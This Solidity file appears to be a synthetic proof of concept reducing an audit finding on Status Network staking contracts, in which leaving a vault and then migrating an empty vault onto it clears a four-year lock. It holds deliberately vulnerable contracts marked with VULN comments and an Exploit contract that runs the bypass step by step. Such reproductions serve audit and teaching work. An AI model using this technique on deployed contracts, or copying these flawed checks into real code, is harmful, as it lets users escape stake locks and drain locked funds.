// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Status Network (Statusl) - bypass stake lock via leave + migrateToVault
    (Cyfrin 2026-01-05 statusl2, finding #65328)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.

    Root cause: StakeManager.leave() unstakes and cleans vault data but does
    not permanently block the vault as a migration target. migrateToVault only
    checks the target is registered and has zero stakedBalance. An empty vault
    can migrate onto the left vault with lockUntil=0, clearing the original
    4-year lock so the full stake can be withdrawn immediately.

    Blamed lines preserved with @> VULN markers.
//////////////////////////////////////////////////////////////////////////*/

contract MockERC20 {
    string public name = "SNT";
    string public symbol = "SNT";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function approve(address sp, uint256 amt) external returns (bool) {
        allowance[msg.sender][sp] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        require(balanceOf[msg.sender] >= amt, "bal");
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        require(a >= amt, "allow");
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amt;
        require(balanceOf[from] >= amt, "bal");
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

struct VaultData {
    uint256 stakedBalance;
    uint256 rewardsAccrued;
    uint256 rewardIndex;
    uint256 lastMPUpdateTime;
    bool hasLeft;
}

struct MigrationData {
    uint256 lockUntil;
    uint256 depositedBalance;
}

interface IStakeVault {
    function owner() external view returns (address);
    function lockUntil() external view returns (uint256);
    function depositedBalance() external view returns (uint256);
    function migrateFromVault(MigrationData calldata data) external;
}

contract StakeManager {
    MockERC20 public immutable STAKING_TOKEN;
    MockERC20 public immutable REWARD_TOKEN;

    mapping(address => VaultData) public vaultData;
    mapping(address => address) public vaultOwners;
    mapping(address => bool) public trusted;
    uint256 public totalRewardsAccrued;

    constructor(MockERC20 staking, MockERC20 reward) {
        STAKING_TOKEN = staking;
        REWARD_TOKEN = reward;
    }

    function registerVault(address vault, address owner_) external {
        vaultOwners[vault] = owner_;
        trusted[vault] = true;
    }

    function stakeFromVault(address vault, uint256 amount) external {
        require(msg.sender == vault, "only vault");
        vaultData[vault].stakedBalance += amount;
    }

    function leave() external {
        require(trusted[msg.sender], "codehash");
        VaultData storage vault = vaultData[msg.sender];

        if (vault.stakedBalance > 0) {
            // calling `_unstake` to update accounting accordingly
            _unstake(vault.stakedBalance, vault); // @> VULN: leave zeros stakedBalance without blocking future migrate-to this vault
        }

        uint256 rewardsToRedeem = vault.rewardsAccrued;
        totalRewardsAccrued -= rewardsToRedeem;
        vault.rewardsAccrued = 0;
        vault.rewardIndex = 0;
        vault.lastMPUpdateTime = 0;
        vault.hasLeft = true;

        if (rewardsToRedeem > 0) {
            REWARD_TOKEN.transfer(IStakeVault(msg.sender).owner(), rewardsToRedeem);
        }
    }

    function _unstake(uint256 amount, VaultData storage vault) internal {
        vault.stakedBalance -= amount;
        STAKING_TOKEN.transfer(msg.sender, amount);
    }

    function migrateToVault(address migrateTo) external {
        require(trusted[msg.sender], "codehash");
        // FIX: revert if vaultData[migrateTo].hasLeft (or source hasLeft)

        if (vaultOwners[migrateTo] == address(0)) {
            // @> VULN: only checks registration, not hasLeft - left vault remains a valid target
            revert("InvalidVault");
        }

        if (vaultData[migrateTo].stakedBalance > 0) {
            // @> VULN: empty left vault passes - lock state can be overwritten after reverse migrate
            revert("MigrationTargetHasFunds");
        }

        MigrationData memory migrationData = MigrationData({
            lockUntil: IStakeVault(msg.sender).lockUntil(),
            depositedBalance: IStakeVault(msg.sender).depositedBalance()
        });

        IStakeVault(migrateTo).migrateFromVault(migrationData);

        delete vaultData[msg.sender];
    }
}

contract StakeVault {
    StakeManager public immutable stakeManager;
    MockERC20 public immutable stakingToken;
    address public owner;
    uint256 public lockUntil;
    uint256 public depositedBalance;

    constructor(StakeManager sm, MockERC20 token, address owner_) {
        stakeManager = sm;
        stakingToken = token;
        owner = owner_;
    }

    function stake(uint256 amount, uint256 lockPeriod) external {
        require(msg.sender == owner, "owner");
        require(stakingToken.transferFrom(msg.sender, address(this), amount), "tf");
        depositedBalance += amount;
        if (lockPeriod > 0) {
            uint256 until = block.timestamp + lockPeriod;
            if (until > lockUntil) lockUntil = until;
        }
        require(stakingToken.transfer(address(stakeManager), amount), "tm");
        stakeManager.stakeFromVault(address(this), amount);
    }

    function leave(address /*to*/) external {
        require(msg.sender == owner, "owner");
        stakeManager.leave();
    }

    function migrateToVault(address target) external {
        require(msg.sender == owner, "owner");
        stakeManager.migrateToVault(target);
    }

    function migrateFromVault(MigrationData calldata data) external {
        if (msg.sender != address(stakeManager)) {
            revert("NotAuthorized");
        }
        lockUntil = data.lockUntil; // @> VULN: overwrites lock; migrate-from empty clears lockUntil to 0
        depositedBalance = data.depositedBalance;
    }

    function withdraw(MockERC20 token, uint256 amount, address to) external {
        require(msg.sender == owner, "owner");
        require(block.timestamp >= lockUntil, "locked");
        require(token.transfer(to, amount), "xfer");
        if (depositedBalance >= amount) depositedBalance -= amount;
        else depositedBalance = 0;
    }
}

contract Exploit {
    MockERC20 public snt; // CREATE 1
    MockERC20 public reward; // CREATE 2
    StakeManager public manager; // CREATE 3
    StakeVault public lockedVault; // CREATE 4
    StakeVault public emptyVault; // CREATE 5

    uint256 public constant STAKE_AMOUNT = 1000e18;
    uint256 public constant LOCK_PERIOD = 4 * 365 days;
    uint256 public withdrawn;

    constructor() {
        snt = new MockERC20();
        reward = new MockERC20();
        manager = new StakeManager(snt, reward);
        lockedVault = new StakeVault(manager, snt, address(this));
        emptyVault = new StakeVault(manager, snt, address(this));
        manager.registerVault(address(lockedVault), address(this));
        manager.registerVault(address(emptyVault), address(this));
    }

    function run() external {
        snt.mint(address(this), STAKE_AMOUNT);
        snt.approve(address(lockedVault), STAKE_AMOUNT);

        lockedVault.stake(STAKE_AMOUNT, LOCK_PERIOD);
        require(lockedVault.lockUntil() > block.timestamp, "not locked");

        // 1) leave locked vault - stakedBalance=0, tokens returned, hasLeft=true (unchecked by migrate)
        lockedVault.leave(address(this));

        // 2) empty vault migrates onto locked vault, writing lockUntil=0 / depositedBalance=0
        emptyVault.migrateToVault(address(lockedVault));

        require(lockedVault.lockUntil() == 0, "lock not cleared by migrate");

        // 3) withdraw immediately - bypasses the 4-year lock
        uint256 before = snt.balanceOf(address(this));
        lockedVault.withdraw(snt, STAKE_AMOUNT, address(this));
        withdrawn = snt.balanceOf(address(this)) - before;

        // HARM: full stake withdrawn while original lock was 4 years (max multiplier, no downside)
        require(withdrawn == STAKE_AMOUNT, "lock bypass failed - stake not withdrawn early");
    }
}
